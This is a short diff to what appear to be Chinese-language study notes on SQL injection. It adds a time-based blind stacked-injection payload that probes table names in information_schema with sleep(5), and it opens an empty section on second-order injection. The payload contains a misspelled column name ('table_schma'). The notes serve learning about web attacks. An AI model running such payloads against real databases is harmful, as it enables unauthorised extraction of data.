@@ -9,5 +9,9 @@
 
 1. 利用堆叠注入获取数据
 ```
-';sel
+';select if(substr((select table_name from information_schema.tables where table_schma=database() limit 0,1),1,1)='e',sleep(5),1)%23
 ```
+
+
+## 二次注入攻击
+
